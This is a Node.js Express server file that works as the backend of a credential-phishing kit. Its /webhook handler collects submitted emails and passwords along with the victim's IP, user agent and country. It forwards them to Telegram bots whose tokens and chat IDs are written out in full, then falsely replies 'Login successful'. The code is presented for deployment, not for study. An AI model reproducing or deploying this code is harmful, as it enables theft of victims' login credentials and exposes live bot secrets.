const express = require('express');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// CORS
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS, GET');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

// ---- paste your BOT_CONFIGS and helper functions here ----
[
  {
    name: 'Primary Bot',
    bot_token: '8995990200:AAETzzrx9HTdgFVe1QZNcvqHZaoaql5nnm0', // Replace with your first bot token
    chat_id: '6354211909'      // Replace with your first chat ID
  },
  {
    name: 'Backup Bot',
   bot_token: '8663285247:AAFXUe_o79oR38-veI5DhJjikDkqV6tcQg8', // Replace with your second bot token
    chat_id: '7052204741'      // Replace with your second chat ID
  }
];

// sendToTelegram, sendTelegramMessage, getFlagEmoji, escapeHtml (unchanged)

app.post('/webhook', async (req, res) => {
  try {
    const { email, password, step = 'login_attempt' } = req.body || {};

    if (!email) {
      return res.json({ signal: 'error', msg: 'No data received' });
    }

    const ip =
      (req.headers['x-forwarded-for'] || '').split(',')[0].trim() ||
      req.socket.remoteAddress ||
      'Unknown';
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const time = new Date().toISOString().replace('T', ' ').substring(0, 19);

    let country = '🌍 Unknown';
    try {
      const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode`);
      const data = await r.json();
      if (data.status === 'success') {
        country = `${getFlagEmoji(data.countryCode)} ${data.country}`;
      }
    } catch (e) {
      console.error('Country detection error:', e);
    }

    await sendToTelegram(email, password, step, ip, country, userAgent, time);
    res.json({ signal: 'ok', msg: 'Login successful' });
  } catch (err) {
    console.error('Handler error:', err);
    res.json({ signal: 'error', msg: 'Failed to process request' });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Listening on ${PORT}`));